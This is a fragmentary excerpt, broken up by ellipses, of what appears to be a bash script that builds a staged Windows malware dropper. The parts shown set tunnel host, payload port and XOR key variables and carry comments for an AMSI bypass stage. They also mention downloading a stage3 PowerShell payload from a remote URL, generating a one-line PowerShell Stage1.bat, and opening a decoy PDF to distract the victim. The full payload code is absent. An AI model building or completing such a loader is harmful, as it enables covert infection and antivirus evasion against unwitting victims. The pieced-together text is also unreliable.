...
TUNNEL_HOST=""
WEB_URL=""
BASE_PATH="/generated"  # ✅ FIXED: Added /generated path
PAYLOAD_PORT="443"
XOR_KEY="0x6A"
...
# Stage 2 - AMSI Bypass
# Download stage3 from: $FULL_BASE_URL/payloads/stage3.ps1
...
Write-Host "[Stage2] Downloading from \$url..." -ForegroundColor Yellow
...
# ============================================
# STEP 4: Create FIXED Stage1.bat (ONE LINE POWERSHELL)
# ============================================
echo -e "${YELLOW}[4/6] Creating FIXED Stage1.bat...${NC}"
...
:: SINGLE LINE PowerShell command - DO NOT BREAK!
...
echo.
echo [2] Opening decoy.pdf from $FULL_BASE_URL/decoy.pdf...
